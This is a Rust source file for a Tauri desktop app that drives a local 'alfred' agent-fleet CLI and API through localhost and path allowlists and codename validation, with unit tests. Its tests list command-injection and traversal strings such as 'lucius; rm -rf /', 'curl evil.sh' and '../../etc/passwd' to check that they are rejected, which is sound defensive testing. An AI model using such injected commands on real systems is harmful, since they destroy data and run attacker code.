use std::process::{Command, Stdio};
use std::time::Duration;

use reqwest::{Method, Url};
use serde::Serialize;
use tauri::menu::{Menu, MenuItem};
use tauri::tray::{TrayIcon, TrayIconBuilder};
use tauri::{AppHandle, Emitter, Manager};

#[derive(Serialize)]
struct NativeCommandResult {
    command: Vec<String>,
    stdout: String,
    stderr: String,
    status: Option<i32>,
    success: bool,
    pid: Option<u32>,
    message: Option<String>,
}

#[tauri::command]
async fn fetch_alfred_json(base_url: String, path: String) -> Result<String, String> {
    request_alfred_json(base_url, path, Method::GET, None).await
}

#[tauri::command]
async fn post_alfred_json(
    base_url: String,
    path: String,
    body: Option<String>,
) -> Result<String, String> {
    request_alfred_json(base_url, path, Method::POST, body).await
}

#[tauri::command]
async fn run_alfred_action(
    action: String,
    target: Option<String>,
) -> Result<NativeCommandResult, String> {
    if action.trim() == "brain_doctor" {
        let primary = run_native_command(
            "alfred".to_string(),
            vec![
                "brain".to_string(),
                "doctor".to_string(),
                "--json".to_string(),
            ],
        )
        .await?;
        if primary.success || !is_unknown_brain_doctor(&primary) {
            return Ok(primary);
        }
        return run_native_command(
            "alfred".to_string(),
            vec![
                "brain".to_string(),
                "status".to_string(),
                "--json".to_string(),
            ],
        )
        .await;
    }

    let (program, args) = build_alfred_action(action.trim(), target.as_deref())?;
    run_native_command(program, args).await
}

#[tauri::command]
fn start_alfred_runtime(port: Option<u16>) -> Result<NativeCommandResult, String> {
    let port = port.unwrap_or(7000);
    if !(1024..=65535).contains(&port) {
        return Err("runtime port must be between 1024 and 65535".to_string());
    }

    let args = vec![
        "serve".to_string(),
        "--port".to_string(),
        port.to_string(),
        "--no-browser".to_string(),
    ];
    let child = Command::new("alfred")
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|err| format!("could not start Alfred local runtime: {err}"))?;

    let pid = child.id();
    Ok(NativeCommandResult {
        command: command_preview("alfred", &args),
        stdout: String::new(),
        stderr: String::new(),
        status: None,
        success: true,
        pid: Some(pid),
        message: Some(format!("started Alfred local runtime on port {port}")),
    })
}

/// Reflect fleet health onto the menu-bar tray. The frontend derives a single
/// health level from the data it already polls and calls this so the tray dot
/// and tooltip track green / yellow / red without the Rust side re-polling.
#[tauri::command]
fn set_tray_status(app: AppHandle, level: String, summary: Option<String>) -> Result<(), String> {
    let Some(tray) = app.tray_by_id(TRAY_ID) else {
        // Tray may be unavailable on headless/test builds; treat as a no-op.
        return Ok(());
    };
    let (dot, label) = tray_glyph(&level);
    let tooltip = match summary {
        Some(text) if !text.trim().is_empty() => format!("Alfred fleet: {label} — {}", text.trim()),
        _ => format!("Alfred fleet: {label}"),
    };
    // The macOS menu-bar title shows the colored dot; the tooltip carries detail.
    let _ = tray.set_title(Some(dot));
    tray.set_tooltip(Some(&tooltip))
        .map_err(|err| format!("could not update tray tooltip: {err}"))?;
    Ok(())
}

const TRAY_ID: &str = "alfred-fleet";

/// Map a health level to a menu-bar dot and a human label. Unknown levels fall
/// back to the neutral "unknown" state rather than erroring.
fn tray_glyph(level: &str) -> (&'static str, &'static str) {
    match level {
        "ok" | "green" => ("🟢", "healthy"),
        "warn" | "yellow" => ("🟡", "needs attention"),
        "error" | "red" => ("🔴", "errors"),
        _ => ("⚪️", "unknown"),
    }
}

async fn request_alfred_json(
    base_url: String,
    path: String,
    method: Method,
    body: Option<String>,
) -> Result<String, String> {
    let mut url = validate_base_url(&base_url)?;
    let (path_part, query) = validate_api_path(&path, &method)?;

    url.set_path(&path_part);
    url.set_query(query);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(20))
        .user_agent("Alfred Desktop/0.1")
        .build()
        .map_err(|err| format!("could not prepare local request: {err}"))?;

    let mut builder = client.request(method, url);
    if let Some(payload) = body {
        builder = builder
            .header("content-type", "application/json")
            .body(payload);
    }

    let response = builder
        .send()
        .await
        .map_err(|err| format!("could not reach alfred serve: {err}"))?;
    let status = response.status();
    let body = response
        .text()
        .await
        .map_err(|err| format!("could not read alfred serve response: {err}"))?;

    if !status.is_success() {
        return Err(format!("alfred serve returned {status}: {body}"));
    }

    Ok(body)
}

fn validate_base_url(raw: &str) -> Result<Url, String> {
    let mut url = Url::parse(raw.trim()).map_err(|_| "enter a valid local URL".to_string())?;
    if url.scheme() != "http" {
        return Err("only http localhost URLs are allowed".to_string());
    }

    let host = url
        .host_str()
        .ok_or_else(|| "local URL needs a host".to_string())?;
    if !matches!(host, "127.0.0.1" | "localhost" | "::1") {
        return Err("only localhost, 127.0.0.1, or ::1 are allowed".to_string());
    }

    url.set_path("/");
    url.set_query(None);
    url.set_fragment(None);
    Ok(url)
}

fn validate_api_path<'a>(
    path: &'a str,
    method: &Method,
) -> Result<(String, Option<&'a str>), String> {
    let trimmed = path.trim();
    if !trimmed.starts_with("/api/") {
        return Err("desktop client may only call Alfred JSON APIs".to_string());
    }
    if trimmed.contains("..") || trimmed.contains('\\') || trimmed.contains("//") {
        return Err("invalid API path".to_string());
    }
    if !trimmed.chars().all(|ch| {
        ch.is_ascii_alphanumeric() || matches!(ch, '/' | '?' | '&' | '=' | '.' | '_' | '-')
    }) {
        return Err("invalid API path characters".to_string());
    }

    let (path_part, query) = trimmed
        .split_once('?')
        .map_or((trimmed, None), |(path_part, query)| {
            (path_part, Some(query))
        });
    let allowed = if method == Method::GET {
        is_allowed_read_path(path_part)
    } else if method == Method::POST {
        is_allowed_compose_draft(path_part)
            || is_allowed_followup_action(path_part)
            || is_allowed_slack_trust_action(path_part)
    } else {
        false
    };
    if !allowed {
        return Err("API path is not part of the desktop contract".to_string());
    }

    Ok((path_part.to_string(), query))
}

fn is_allowed_read_path(path: &str) -> bool {
    let allowed = [
        "/api/status",
        "/api/actions",
        "/api/firings",
        "/api/plans",
        "/api/slack/trusted-users",
    ];
    allowed
        .iter()
        .any(|prefix| path == *prefix || path.starts_with(&format!("{prefix}/")))
}

fn is_allowed_compose_draft(path: &str) -> bool {
    // POST /api/plans/draft is the in-app spec/plan authoring endpoint.
    path == "/api/plans/draft"
}

fn is_allowed_followup_action(path: &str) -> bool {
    let Some(rest) = path.strip_prefix("/api/plans/") else {
        return false;
    };
    let parts: Vec<&str> = rest.split('/').collect();
    if parts.len() != 2 || parts[0].is_empty() {
        return false;
    }
    matches!(parts[1], "convert-followup" | "mark-handled")
}

fn is_allowed_slack_trust_action(path: &str) -> bool {
    if path == "/api/slack/trusted-users" {
        return true;
    }
    let Some(rest) = path.strip_prefix("/api/slack/trusted-users/") else {
        return false;
    };
    let parts: Vec<&str> = rest.split('/').collect();
    parts.len() == 2 && !parts[0].is_empty() && parts[1] == "remove"
}

fn build_alfred_action(
    action: &str,
    target: Option<&str>,
) -> Result<(String, Vec<String>), String> {
    match action {
        "dry_run" => {
            let codename = validate_codename(
                target.ok_or_else(|| "dry-run needs an agent codename".to_string())?,
            )?;
            Ok(("alfred".to_string(), vec!["dry-run".to_string(), codename]))
        }
        // Fleet service-control verbs. Each one shells `alfred <verb> <codename>`
        // with a fixed verb and a codename that has to pass `validate_codename`
        // before it can become a process argument, so a caller can never inject
        // arbitrary shell or smuggle a second flag through `target`.
        "pause" => {
            let codename = validate_fleet_target(
                target.ok_or_else(|| "pause needs an agent codename".to_string())?,
            )?;
            Ok(("alfred".to_string(), vec!["pause".to_string(), codename]))
        }
        "resume" => {
            let codename = validate_fleet_target(
                target.ok_or_else(|| "resume needs an agent codename".to_string())?,
            )?;
            Ok(("alfred".to_string(), vec!["resume".to_string(), codename]))
        }
        "run" => {
            let codename = validate_codename(
                target.ok_or_else(|| "run needs an agent codename".to_string())?,
            )?;
            Ok(("alfred".to_string(), vec!["run".to_string(), codename]))
        }
        "status" => Ok((
            "alfred".to_string(),
            vec!["status".to_string(), "--json".to_string()],
        )),
        "agents" => Ok(("alfred".to_string(), vec!["agents".to_string()])),
        "auth_status" => Ok((
            "alfred".to_string(),
            vec!["auth".to_string(), "status".to_string()],
        )),
        "brain_doctor" => unreachable!("brain_doctor is handled with compatibility fallback"),
        "redis_status" => Ok((
            "alfred".to_string(),
            vec![
                "brain".to_string(),
                "redis-status".to_string(),
                "--json".to_string(),
            ],
        )),
        _ => Err("unknown native Alfred action".to_string()),
    }
}

async fn run_native_command(
    program: String,
    args: Vec<String>,
) -> Result<NativeCommandResult, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let preview = command_preview(&program, &args);
        let output = Command::new(&program)
            .args(&args)
            .stdin(Stdio::null())
            .output()
            .map_err(|err| format!("could not run {}: {err}", preview.join(" ")))?;
        Ok(NativeCommandResult {
            command: preview,
            stdout: trim_output(&output.stdout),
            stderr: trim_output(&output.stderr),
            status: output.status.code(),
            success: output.status.success(),
            pid: None,
            message: None,
        })
    })
    .await
    .map_err(|err| format!("native action failed to complete: {err}"))?
}

fn validate_codename(value: &str) -> Result<String, String> {
    let clean = value.trim();
    if clean.is_empty() || clean.len() > 80 {
        return Err("agent codename is missing or too long".to_string());
    }
    // A leading hyphen would let the value be parsed by `alfred` as a flag
    // (e.g. `--force`) rather than a positional agent name. Reject it so a
    // codename can never smuggle an option past the CLI's argument parser.
    if clean.starts_with('-') {
        return Err("agent codename may not start with a hyphen".to_string());
    }
    if !clean
        .chars()
        .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-'))
    {
        return Err("agent codename contains unsupported characters".to_string());
    }
    Ok(clean.to_string())
}

/// Validate a pause/resume target. These two verbs additionally accept the
/// literal `all` (the CLI's fleet-wide form, used by the tray's pause-all /
/// resume-all). `all` already satisfies `validate_codename` (it is plain
/// alphanumeric), so this is the same character allowlist; the helper exists to
/// document intent and keep the call sites symmetric with `run`/`dry_run`,
/// which deliberately require a single named agent.
fn validate_fleet_target(value: &str) -> Result<String, String> {
    validate_codename(value)
}

fn command_preview(program: &str, args: &[String]) -> Vec<String> {
    let mut command = vec![program.to_string()];
    command.extend(args.iter().cloned());
    command
}

fn trim_output(bytes: &[u8]) -> String {
    const MAX_CHARS: usize = 20_000;
    let text = String::from_utf8_lossy(bytes).to_string();
    if text.chars().count() <= MAX_CHARS {
        return text;
    }
    let mut trimmed: String = text.chars().take(MAX_CHARS).collect();
    trimmed.push_str("\n...[truncated]");
    trimmed
}

fn is_unknown_brain_doctor(result: &NativeCommandResult) -> bool {
    let haystack = format!("{}\n{}", result.stdout, result.stderr).to_ascii_lowercase();
    haystack.contains("invalid choice")
        || haystack.contains("unknown command")
        || haystack.contains("usage: alfred-brain")
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            fetch_alfred_json,
            post_alfred_json,
            run_alfred_action,
            start_alfred_runtime,
            set_tray_status
        ])
        .setup(|app| {
            if let Err(err) = build_tray(app.handle()) {
                // A missing tray must never crash the app; the in-app
                // notification center is the primary surface regardless.
                eprintln!("alfred: tray unavailable ({err})");
            }
            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

/// Build the menu-bar tray with quick actions. Menu clicks emit events the
/// frontend listens for (`tray://open`, `tray://pause-all`, `tray://resume-all`)
/// so the actual fleet calls reuse the same validated `run_alfred_action` path.
fn build_tray(app: &AppHandle) -> tauri::Result<TrayIcon> {
    let open = MenuItem::with_id(app, "open", "Open Alfred", true, None::<&str>)?;
    let pause_all = MenuItem::with_id(app, "pause-all", "Pause all agents", true, None::<&str>)?;
    let resume_all = MenuItem::with_id(app, "resume-all", "Resume all agents", true, None::<&str>)?;
    let quit = MenuItem::with_id(app, "quit", "Quit", true, None::<&str>)?;
    let menu = Menu::with_items(app, &[&open, &pause_all, &resume_all, &quit])?;

    TrayIconBuilder::with_id(TRAY_ID)
        .icon(app.default_window_icon().cloned().ok_or_else(|| {
            tauri::Error::AssetNotFound("default window icon for tray".to_string())
        })?)
        .title("⚪️")
        .tooltip("Alfred fleet: unknown")
        .menu(&menu)
        .show_menu_on_left_click(true)
        .on_menu_event(|app, event| match event.id.as_ref() {
            "open" => focus_main_window(app),
            "pause-all" => {
                focus_main_window(app);
                let _ = app.emit("tray://pause-all", ());
            }
            "resume-all" => {
                focus_main_window(app);
                let _ = app.emit("tray://resume-all", ());
            }
            "quit" => app.exit(0),
            _ => {}
        })
        .build(app)
}

fn focus_main_window(app: &AppHandle) {
    if let Some(window) = app.get_webview_window("main") {
        let _ = window.show();
        let _ = window.unminimize();
        let _ = window.set_focus();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn post_allowlist_uses_path_without_query() {
        let err = validate_api_path("/api/plans/followup?next=/convert-followup", &Method::POST)
            .expect_err("query string must not satisfy the POST allowlist");
        assert!(err.contains("desktop contract"));
    }

    #[test]
    fn post_allowlist_accepts_followup_action_path() {
        let (path, query) = validate_api_path(
            "/api/plans/followup-123/convert-followup?dry=1",
            &Method::POST,
        )
        .expect("valid follow-up action should be accepted");
        assert_eq!(path, "/api/plans/followup-123/convert-followup");
        assert_eq!(query, Some("dry=1"));
    }

    #[test]
    fn post_allowlist_accepts_compose_draft_path() {
        let (path, query) = validate_api_path("/api/plans/draft", &Method::POST)
            .expect("compose draft path should be accepted for POST");
        assert_eq!(path, "/api/plans/draft");
        assert_eq!(query, None);
    }

    #[test]
    fn post_allowlist_accepts_slack_trust_paths() {
        let (path, query) = validate_api_path("/api/slack/trusted-users", &Method::POST)
            .expect("trust add path should be accepted for POST");
        assert_eq!(path, "/api/slack/trusted-users");
        assert_eq!(query, None);

        let (path, _query) =
            validate_api_path("/api/slack/trusted-users/U123ABC/remove", &Method::POST)
                .expect("trust remove path should be accepted for POST");
        assert_eq!(path, "/api/slack/trusted-users/U123ABC/remove");
    }

    #[test]
    fn get_allowlist_accepts_compose_drafts_list_path() {
        let (path, query) = validate_api_path("/api/plans/drafts", &Method::GET)
            .expect("compose drafts list path should be accepted for GET");
        assert_eq!(path, "/api/plans/drafts");
        assert_eq!(query, None);
    }

    #[test]
    fn compose_draft_path_is_not_a_read_route() {
        // The single-segment draft path is only reachable via POST; a GET must
        // still pass the read allowlist (which it does via the /api/plans prefix)
        // but the write path must not leak into the follow-up two-segment rule.
        assert!(is_allowed_compose_draft("/api/plans/draft"));
        assert!(!is_allowed_compose_draft("/api/plans/draft/extra"));
        assert!(!is_allowed_followup_action("/api/plans/draft"));
    }

    #[test]
    fn fleet_control_actions_build_fixed_verb_with_validated_codename() {
        for (action, verb) in [("pause", "pause"), ("resume", "resume"), ("run", "run")] {
            let (program, args) =
                build_alfred_action(action, Some("lucius")).expect("valid codename is accepted");
            assert_eq!(program, "alfred");
            assert_eq!(args, vec![verb.to_string(), "lucius".to_string()]);
        }
    }

    #[test]
    fn fleet_control_accepts_fully_qualified_codename() {
        let (_, args) = build_alfred_action("pause", Some("example.fleet.lucius"))
            .expect("dotted codename is accepted");
        assert_eq!(
            args,
            vec!["pause".to_string(), "example.fleet.lucius".to_string()]
        );
    }

    #[test]
    fn pause_and_resume_allow_the_all_keyword_but_run_does_not_special_case_it() {
        // pause/resume accept the CLI's fleet-wide `all` form (tray pause-all).
        let (_, pause_args) =
            build_alfred_action("pause", Some("all")).expect("pause all is accepted");
        assert_eq!(pause_args, vec!["pause".to_string(), "all".to_string()]);
        let (_, resume_args) =
            build_alfred_action("resume", Some("all")).expect("resume all is accepted");
        assert_eq!(resume_args, vec!["resume".to_string(), "all".to_string()]);
        // `run all` is not rejected (the CLI itself decides), but `all` is just
        // passed through as a single, validated argument — never expanded here.
        let (_, run_args) =
            build_alfred_action("run", Some("all")).expect("run all passes through");
        assert_eq!(run_args, vec!["run".to_string(), "all".to_string()]);
    }

    #[test]
    fn fleet_control_rejects_codename_injection() {
        // A codename carrying shell metacharacters, spaces, flags, or path
        // traversal must never reach `alfred` as an argument.
        let hostile = [
            "lucius; rm -rf /",
            "lucius && curl evil.sh",
            "lucius | tee x",
            "$(whoami)",
            "`id`",
            "--force",
            "-rf",
            "lucius bane",
            "../../etc/passwd",
            "lucius\nresume all",
            "agent/with/slash",
        ];
        for action in ["pause", "resume", "run"] {
            for bad in hostile {
                let err = build_alfred_action(action, Some(bad))
                    .expect_err("hostile codename must be rejected");
                assert!(
                    err.contains("codename"),
                    "{action} should reject {bad:?} with a codename error, got: {err}"
                );
            }
        }
    }

    #[test]
    fn fleet_control_requires_a_target() {
        for action in ["pause", "resume", "run"] {
            let err =
                build_alfred_action(action, None).expect_err("a missing target must be rejected");
            assert!(err.contains("needs an agent codename"));
        }
    }

    #[test]
    fn unknown_actions_are_still_rejected() {
        let err = build_alfred_action("destroy", Some("lucius"))
            .expect_err("unlisted verbs must not pass the allowlist");
        assert!(err.contains("unknown native Alfred action"));
    }

    #[test]
    fn validate_codename_caps_length() {
        let long = "a".repeat(81);
        assert!(validate_codename(&long).is_err());
        let ok = "a".repeat(80);
        assert_eq!(validate_codename(&ok).expect("80 chars is allowed"), ok);
    }
}
